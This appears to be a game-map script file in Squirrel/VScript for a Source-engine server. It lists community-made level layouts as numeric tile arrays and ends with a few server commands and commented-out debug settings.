maps.push({name="Ladder Canyon",author="ReBeL",id="#1741477484",direction="forward",cost=244,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,131,0,0,0,0,23,94,94,94,0,0,14,14,0,0,0,0,0,0,0,23,0,0,0,0,23,23,89,89,23,23,14,14,23,23,1,23,93,23,23,23,0,0,0,0,23,23,23,23,23,14,14,14,23,23,1,23,93,0,0,0,0,0,0,0,23,23,23,14,14,14,14,14,23,23,1,23,93,0,0,0,0,0,0,0,23,23,14,14,14,14,14,14,14,14,1,1,1,1,0,0,0,0,0,0,23,23,14,14,0,0,0,0,14,14,14,14,14,23,0,0,3,90,3,0,23,14,14,23,3,0,0,3,23,14,14,14,14,23,94,0,0,0,0,0,23,14,14,23,3,0,0,3,23,23,14,14,14,23,94,0,0,0,0,0,23,14,14,23,0,0,0,0,23,23,23,14,14,23,94,0,3,0,0,0,23,14,14,23,0,0,0,0,23,23,14,14,14,23,0,0,91,0,0,0,23,14,14,23,23,0,0,0,23,23,14,14,23,23,0,0,91,0,0,0,23,14,14,23,23,0,0,0,23,14,14,14,23,23,0,0,3,0,0,0,23,23,14,14,14,0,0,0,14,14,14,23,23,0,0,0,0,0,0,0,23,23,23,23,14,14,14,14,14,14,14,23,23,0,3,0,0,0,0,0,23,23,23,23,14,14,14,14,14,23,23,23,0,0,90,0,91,3,0,0,23,100,23,23,14,14,23,23,23,23,100,23,0,0,3,0,91,3,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,94,94,0,0,0,0,0,132,14,14,0,0,0,0,0,0,0,0,94,94,94,94,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,94,94]});
maps.push({name="Team Work",author="DEX DZ",id="#1741481622",direction="forward",cost=457,elevation=7,map=[11,93,11,1,0,1,1,1,2,2,1,1,1,0,0,1,1,11,100,11,1,91,1,1,0,1,5,5,5,5,5,5,1,1,1,1,1,1,91,1,11,91,11,1,1,5,5,5,5,5,5,5,5,1,0,1,11,91,11,11,91,132,91,1,1,5,5,94,5,5,94,5,5,1,1,1,91,134,91,11,11,91,11,1,5,5,5,5,5,5,5,5,5,5,1,1,11,91,11,11,11,136,11,1,133,5,5,5,5,5,5,5,5,131,1,1,11,11,136,11,11,11,11,1,5,5,5,5,137,5,5,5,5,5,1,1,11,11,11,11,0,140,140,1,1,7,7,7,7,7,7,7,7,1,1,1,0,135,135,1,0,199,140,1,1,7,7,7,7,8,8,8,8,1,0,1,0,135,199,1,0,140,140,1,1,10,10,96,10,10,98,10,10,1,0,1,0,135,135,1,0,140,199,0,1,10,96,125,96,98,125,98,10,1,0,1,0,199,135,1,0,140,140,0,1,0,0,0,0,0,0,0,0,1,1,1,0,135,135,1,0,199,140,0,1,0,0,0,0,0,0,0,0,1,0,0,0,135,199,1,0,140,140,0,199,0,0,0,0,0,0,0,0,199,0,0,0,135,135,1,0,66,66,0,199,66,66,66,66,66,66,66,66,199,0,0,0,199,135,1,0,15,15,0,199,66,66,90,66,66,90,66,66,199,0,11,0,135,135,1,0,15,86,184,184,90,12,12,90,90,12,12,90,184,184,86,11,11,11,1,0,0,15,15,199,12,12,12,12,12,12,12,12,199,0,11,0,11,86,1,15,15,0,15,199,12,12,12,12,12,12,12,12,199,0,11,11,11,11,1,15,99,100,15,199,199,199,199,2,2,199,199,199,199,0,11,93,97,11,1]});
maps.push({name="Off by Cliffs",author="ReBeL",id="#1741481819",direction="forward",cost=331,elevation=0,map=[1,1,1,1,1,1,2,2,0,0,0,0,0,65,34,34,34,0,0,0,1,1,1,1,1,1,34,34,0,0,0,0,0,34,34,34,34,34,0,0,1,1,1,1,1,34,34,34,0,3,39,0,0,34,34,1,90,34,34,0,1,1,1,1,34,34,34,0,0,39,39,0,34,34,1,1,1,90,34,34,1,100,1,1,34,34,34,0,0,0,0,34,34,1,1,1,1,1,34,34,1,34,1,34,34,0,0,0,0,34,34,34,1,1,1,1,34,34,34,0,1,141,1,34,34,34,34,34,34,34,34,1,1,1,1,1,1,34,34,0,0,0,1,1,34,34,34,34,34,34,34,1,1,1,1,1,1,1,34,34,0,0,1,1,1,1,1,1,1,1,1,1,1,34,1,1,1,34,34,0,65,0,0,0,0,0,34,34,1,1,1,1,34,34,34,34,96,34,0,0,25,0,3,0,0,34,34,34,34,34,34,34,34,34,34,0,96,0,0,0,34,34,34,0,0,34,1,1,1,1,1,1,3,0,0,0,96,0,0,34,34,1,1,0,0,34,34,34,1,1,1,1,0,0,0,0,96,0,34,34,34,1,1,34,34,34,34,34,1,1,1,1,29,29,1,1,1,1,34,34,34,1,1,1,1,1,1,1,1,1,1,94,29,29,1,1,1,97,34,34,34,34,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,34,34,34,1,1,1,1,1,1,1,1,1,1,1,34,34,34,34,94,0,0,0,34,34,34,34,34,34,34,1,1,1,1,34,34,34,34,34,94,0,0,0,0,0,0,0,0,0,34,1,1,1,34,34,34,34,34,34,34,0,0,0,0,0,0,0,0,0,34,34,34,34,34,34,2,2,34,34,34]});
maps.push({name="Interrobang",author="ReBeL",id="#1741483285",direction="forward",cost=242,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,125,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,9,9,125,0,0,0,0,0,0,9,73,73,73,73,73,0,0,40,40,40,40,40,40,0,0,100,40,40,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,40,40,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,40,40,40,40,40,40,40,40,40,40,40,40,40,0,40,40,0,0,0,9,40,40,40,40,40,40,40,40,40,40,40,40,40,0,40,40,0,0,0,9,40,40,9,9,9,9,9,40,40,9,9,72,0,0,0,0,0,0,0,9,40,40,9,1,1,1,9,40,40,89,9,72,0,0,0,0,0,0,0,9,40,40,9,1,1,1,9,40,40,89,9,72,0,0,0,0,0,0,0,9,40,40,9,1,1,1,9,40,40,9,9,72,0,0,0,0,0,0,0,9,40,40,9,9,9,9,9,40,40,9,89,72,0,0,0,0,0,0,0,9,40,40,40,40,40,40,40,40,40,9,89,72,0,0,0,0,0,0,0,9,40,40,40,40,40,40,40,40,40,9,9,72,0,0,0,0,0,0,0,9,9,9,9,9,9,9,89,89,9,9,90,9,0,0,0,0,0,0,0,0,9,9,9,89,89,9,9,9,9,90,90,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="pi",author="ReBeL",id="#1741483327",direction="forward",cost=139,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,0,34,34,125,34,125,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,34,7,7,34,7,7,34,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,34,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,34,7,7,7,0,0,0,0,0,0,0,0,0,34,35,36,37,34,34,34,34,34,34,34,0,0,0,0,0,0,0,0,0,3,0,0,0,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,7,7,34,0,0,0,0,0,0,0,0,93,3,0,0,0,34,7,7,34,7,7,34,0,0,0,0,0,0,0,0,0,0,0,0,0,34,7,7,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Gotta check behind",author="Luffaren",id="#1741483961",direction="left",cost=257,elevation=-19,map=[0,0,0,0,0,94,1,24,2,2,24,1,94,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,24,24,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,24,24,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,19,19,19,19,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,19,19,89,19,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,19,19,19,19,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,9998,14,48,100,14,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,6,48,95,48,14,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,9998,14,14,14,14,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,9,9,9,9,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,9,9,89,9,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,9,9,9,9,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,65,65,65,65,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,65,65,65,65,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,65,65,65,65,5,5,0,0,0,0,0,0,0,90,5,90,5,90,5,5,65,65,65,65,5,5,90,5,90,5,90,5,90,2,5,89,5,5,89,5,65,65,65,65,5,5,5,5,5,5,5,5,93,2,5,5,89,5,5,5,65,65,65,65,5,5,5,5,5,5,5,5,93,90,5,90,5,90,5,5,65,65,65,65,5,5,90,5,90,5,90,5,90,0,0,0,0,0,0,0,67,67,67,67,0,0,0,0,0,0,0,0,0]});
maps.push({name="Dominican Mapping",author="ReBeL",id="#1741483999",direction="forward",cost=204,elevation=15,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,9,0,0,9,0,0,9,0,0,9,0,0,9,0,0,9,0,0,0,0,9,0,0,9,0,0,9,0,0,9,0,0,9,0,0,9,0,0,0,0,127,0,0,127,0,0,127,0,0,127,0,0,127,0,0,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,141,141,141,141,141,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,24,24,24,24,24,24,24,23,22,21,20,19,18,17,16,15,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,94,90,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,94,94,24,24,24,24,24,24,24,24,24,24,24,24,24,93,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="ObJ maps be liek",author="ReBeL",id="#1741484706",direction="forward",cost=342,elevation=10,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,1,0,0,0,0,0,28,28,30,30,32,32,34,34,32,32,30,30,28,28,1,0,0,0,0,0,28,28,30,30,32,32,34,34,32,32,30,30,28,28,1,0,0,0,141,0,28,28,1,1,1,1,1,1,1,1,1,1,28,28,1,0,0,0,34,1,28,28,28,28,28,28,28,28,28,28,28,28,28,28,1,0,0,0,34,1,29,74,74,74,74,74,29,29,73,73,73,73,73,29,1,0,0,0,34,1,29,74,74,74,74,74,30,30,73,73,73,73,73,29,1,0,0,0,34,1,1,74,74,74,74,74,31,31,73,73,73,73,73,30,1,0,0,0,34,1,29,74,74,74,74,74,32,32,73,73,73,73,73,31,1,0,0,0,96,1,141,32,32,74,74,74,33,33,73,73,73,73,97,32,1,0,0,0,0,1,1,1,32,93,74,74,34,34,73,73,73,73,94,32,1,0,0,0,0,0,0,1,1,1,1,1,96,96,1,1,1,1,1,1,1,0,0,0,3,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,3,3,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,44,44,44,44,0,0,0,0,0,0,0,0,0,44,44,44,44,44,44,44,44,44,44,44,44,0,0,0,0,0,0,0,0,44,44,44,44,44,44,44,2,2,44,44,44,0,0,0,0,0,0,0,0]});





foreach(map in maps){::cached_maps["mapimages/"+split(map.id,"#")[1]+".vmt"]<-map;}//--------------------------------------------------------------\\
//};newthread(::_SetMapsFirst.bindenv(this)).call();}//__CSS__threading_disabled//-----------------------------------------------------------------\\
};::_SetMapsFirst();}EntFire("server","Command","mp_flashlight 0",0.00,null);//__CSS__ flashlights bug out the fog for some reason//---------------\\
EntFire("server","Command","zr_class_modify humans no_fall_damage no",0.00,null);//__CSS__ force falldamage on//-----------------------------------\\
::Ent(Vector(),Vector(),"env_fade",{spawnflags=1,holdtime=1.30,duration=0.30,rendercolor="0 0 0",},{//---------------------------------------------\\
function Run(){self.AcceptInput("Fade","",null,null);EntFireByHandle(self,"Kill","",2.00,null,null);}});//-----------------------------------------\\
//-------------------------------------------------------------------------------------------------------------------------------------------------\\
//::stage=0;::MTEST=true;::STAGES[0].stage_goal=1;::STAGES[0].ending="RACE";maps.clear();::delay_check_enabled=false;delete ::maps_first_set;//----\\
//DEBUG_MCYC=true;::MTEST=true;maps.clear();::stage<-100;::delay_check_enabled=false;delete ::maps_first_set;//------------------------------------\\
//::FORCE_THEME = "generic";
//::finale_infinitemode_minlevels=1;


